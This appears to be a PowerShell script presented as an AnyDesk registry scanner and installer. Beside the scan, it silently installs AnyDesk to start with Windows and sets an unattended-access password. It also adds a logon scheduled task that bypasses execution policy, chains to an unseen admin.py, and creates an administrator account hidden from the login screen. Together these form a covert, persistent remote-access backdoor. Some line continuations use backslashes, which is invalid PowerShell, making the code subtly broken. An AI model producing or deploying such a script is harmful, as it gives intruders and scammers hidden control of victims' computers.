# Improved AnyDesk Registry and Installation Script
# ================================================
# This script scans key AnyDesk registry locations, logs results, and provides a modular install function.
# Sensitive data should be provided securely (not hardcoded).

# --- CONFIGURATION ---
$LogPath = "$env:USERPROFILE\Desktop\AnyDesk_Core_Log.txt"
$ScriptPath = "$env:USERPROFILE\Desktop\Query-AnyDesk-Core.ps1"
$TaskName = "QueryAnyDeskCore"

# Registry keys to scan
$AnyDeskRegistryKeys = @(
    "HKLM:\SOFTWARE\Clients\Media\AnyDesk",
    "HKLM:\SYSTEM\CurrentControlSet\Services\AnyDesk",
    "HKLM:\SOFTWARE\Classes\.anydesk\shell\open\command",
    "HKLM:\SOFTWARE\Classes\AnyDesk\shell\open\command",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\AnyDesk Printer",
    "HKLM:\DRIVERS\DriverDatabase\DeviceIds\USBPRINT\AnyDesk",
    "HKLM:\DRIVERS\DriverDatabase\DeviceIds\WSDPRINT\AnyDesk",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\AnyDesk"
)

# --- FUNCTIONS ---
function Log-RegistryKeys {
    param (
        [string[]]$Keys,
        [string]$LogFile
    )
    "=== AnyDesk Registry Scan - $(Get-Date) ===`n" | Out-File -FilePath $LogFile
    foreach ($key in $Keys) {
        Add-Content -Path $LogFile -Value ">>> $key"
        if (Test-Path $key) {
            try {
                $props = Get-ItemProperty -Path $key
                foreach ($p in $props.PSObject.Properties) {
                    Add-Content -Path $LogFile -Value "`t$($p.Name) : $($p.Value)"
                }
            } catch {
                Add-Content -Path $LogFile -Value "`t[ERROR] Could not access key: $_"
            }
        } else {
            Add-Content -Path $LogFile -Value "`t[NOT FOUND]"
        }
        Add-Content -Path $LogFile -Value "`n"
    }
    Write-Output "Registry data saved to: $LogFile"
}

function Register-AnyDeskScheduledTask {
    param (
        [string]$TaskName,
        [string]$ScriptPath
    )
    try {
        Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$ScriptPath`"") \
            -Trigger (New-ScheduledTaskTrigger -AtLogOn) \
            -TaskName $TaskName -Description "Auto-log AnyDesk registry keys" -User "$env:USERNAME" -RunLevel Highest -Force
        Write-Output "Scheduled task '$TaskName' registered."
    } catch {
        Write-Output "[ERROR] Failed to register scheduled task: $_"
    }
}

function Install-AnyDesk {
    param (
        [string]$InstallPath = "C:\ProgramData\AnyDesk",
        [string]$AnyDeskUrl = "http://download.anydesk.com/AnyDesk.exe",
        [string]$Password, # Pass as argument for security
        [string]$AdminUsername,
        [string]$AdminPassword
    )
    try {
        if (-not (Test-Path -Path $InstallPath -PathType Container)) {
            New-Item -Path $InstallPath -ItemType Directory | Out-Null
        }
        $exePath = Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe"
        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile $exePath
        Start-Process -FilePath $exePath -ArgumentList "--install $InstallPath --start-with-win --silent" -Wait
        if ($Password) {
            Start-Process -FilePath $exePath -ArgumentList "--set-password=$Password" -Wait
        }
        if ($AdminUsername -and $AdminPassword) {
            if (-not (Get-LocalUser -Name $AdminUsername -ErrorAction SilentlyContinue)) {
                $securePass = ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force
                New-LocalUser -Name $AdminUsername -Password $securePass
                Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
                Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
            }
        }
        Start-Process -FilePath $exePath -ArgumentList "--get-id" -Wait
        Write-Host "Installation completed successfully."
    } catch {
        Write-Host "[ERROR] Installation failed: $_"
    }
}

function Invoke-AdminPy {
    param (
        [string]$PythonPath = "python",
        [string]$ScriptPath = "$PSScriptRoot\admin.py"
    )
    try {
        Write-Host "[*] Invoking admin.py for AnyDesk admin tasks..."
        $process = Start-Process -FilePath $PythonPath -ArgumentList "\"$ScriptPath\"" -NoNewWindow -Wait -PassThru
        if ($process.ExitCode -eq 0) {
            Write-Host "admin.py executed successfully."
        } else {
            Write-Host "[ERROR] admin.py exited with code $($process.ExitCode)"
        }
    } catch {
        Write-Host "[ERROR] Failed to run admin.py: $_"
    }
}

# --- MAIN EXECUTION ---
Log-RegistryKeys -Keys $AnyDeskRegistryKeys -LogFile $LogPath
Register-AnyDeskScheduledTask -TaskName $TaskName -ScriptPath $ScriptPath

# Default: Chain to admin.py for admin tasks
Invoke-AdminPy

# Example: Call Install-AnyDesk with parameters (do not hardcode passwords in production)
# Install-AnyDesk -Password "YourPassword" -AdminUsername "YourAdmin" -AdminPassword "YourAdminPassword"